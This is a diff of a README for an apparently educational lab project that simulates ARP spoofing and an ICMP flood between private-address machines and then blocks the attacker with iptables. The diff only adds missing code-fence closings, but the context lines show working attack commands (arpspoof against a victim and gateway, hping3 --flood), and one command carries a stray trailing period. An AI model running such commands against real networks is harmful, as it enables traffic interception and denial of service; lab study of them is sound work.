@@ -22,6 +22,7 @@ The goal of this project was to simulate **network attacks** such as ARP spoofin
    ```bash
    ping 192.168.1.20   # from attacker to victim
    ping 192.168.1.10   # from victim to attacker
+   ```
 
 Note: Successful pings confirm communication.
 
@@ -31,6 +32,7 @@ Note: Successful pings confirm communication.
 
 ```bash
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward.
+```
 
 Output `1` means IP forwarding is active.
 
@@ -40,6 +42,7 @@ Output `1` means IP forwarding is active.
 sudo apt update
 sudo apt install dsniff
 sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+```
 
 This tricks the victim into sending traffic meant for the gateway (`192.168.1.1`) to the attacker.
 
@@ -49,6 +52,7 @@ This tricks the victim into sending traffic meant for the gateway (`192.168.1.1`
 ```bash
 sudo apt install hping3
 sudo hping3 -1 --flood -p 80 192.168.1.20
+```
 
 
 This sends an aggressive flood of ICMP packets to the victim system.
@@ -60,6 +64,7 @@ On the Ubuntu defender system, use **iptables** to block the attacker:
 ```bash
 sudo iptables -A INPUT -s 192.168.1.10 -p icmp -j DROP
 sudo iptables -L
+```
 
 This prevents ICMP packets from the attacker, stopping the flood.
 
